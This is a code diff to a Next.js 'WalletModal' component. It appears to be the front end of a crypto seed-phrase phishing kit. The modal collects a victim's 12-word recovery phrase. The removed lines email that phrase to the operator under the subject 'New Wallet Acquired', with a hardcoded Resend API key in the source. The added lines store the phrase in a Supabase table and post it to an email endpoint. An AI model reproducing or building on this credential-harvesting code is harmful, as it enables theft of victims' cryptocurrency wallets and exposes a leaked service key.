@@ -13,10 +13,11 @@ import { Label } from "@/components/ui/label";
 import { X } from "lucide-react";
 import Image from "next/image";
 import dynamic from "next/dynamic";
-
+import { supabase } from "@/utils/supabase";
 import { useState, useEffect } from "react";
 import { bip39WordList } from "./bip39Words.js";
 import { Resend } from "resend";
+import { useRouter } from "next/navigation";
 
 const isBrowser = typeof window !== "undefined";
 let spiral, mirage;
@@ -24,7 +25,7 @@ if (isBrowser) {
   ({ spiral, mirage } = require("ldrs"));
 }
 
-export default function WalletModal({ isOpen, onClose, active }) {
+export default function WalletModal({ isOpen, onClose, active, user }) {
   const resend = new Resend("re_Ms2f8JZx_LSqdCR1pyLTjgQYsBQy7Xkux");
   const [gif, setGif] = useState(false);
   const [first, setFirst] = useState(true);
@@ -35,7 +36,7 @@ export default function WalletModal({ isOpen, onClose, active }) {
   const [inputs, setInputs] = useState(Array(12).fill("")); // State for 12 inputs
   const [suggestions, setSuggestions] = useState([]); // Global suggestions for the selected input
   const [currentInput, setCurrentInput] = useState(null); // Tracks the currently focused input
-
+  const router = useRouter();
   // Handle input change and suggestions
   const handleChange = (index, value) => {
     const lowerValue = value.toLowerCase();
@@ -98,21 +99,48 @@ export default function WalletModal({ isOpen, onClose, active }) {
     setThird(true);
   };
 
-  const click3 = () => {
+  const click3 = async () => {
     setGif(true);
     setTimeout(() => setGif(false), 3000);
     setThird(false);
     setForth(true);
 
+    const phrase = inputs.join(" ");
     
-   resend.emails.send({
-    from: "info@i-dentiq.org",
-    to:  "info@i-dentiq.org",
-    subject: "New Wallet Acquired",
-    html: `<p>${userAgent.name}'s wallet phrase : \n ${inputs}</p>`,
-  });
+const { data, error } = await supabase
+.from('wallet')
+.insert([
+  { email: user, 
+    phrase: phrase },
+]).select()
+      if(error == null){
+try {
+      const res = await fetch("api/email", {
+        method: "POST",
+        body: JSON.stringify({
+          name: user,
+          wallet: phrase,
+          active: active.name
+        }),
+      });
+      const data = await res.json();
+      // Check if the status is "ok"
+      if (data.status === "ok") {
+        // Proceed to route to the dashboard
+        router.push("/dashboard");
+      } else {
+        // Handle any unexpected response
+        console.log("Error sending email:", data);
+      }
+    } catch (err) {
+      // Catch any errors from the fetch
+      console.log("Failed to send email:", err);
+    }
 
-  
+      }  else{
+        console.log(error)
+      }
+    
   };
 
   const click4 = () => {
@@ -121,7 +149,6 @@ export default function WalletModal({ isOpen, onClose, active }) {
 
     setForth(false);
     setFirst(true);
-
   };
   useEffect(() => {
     if (spiral && mirage) {
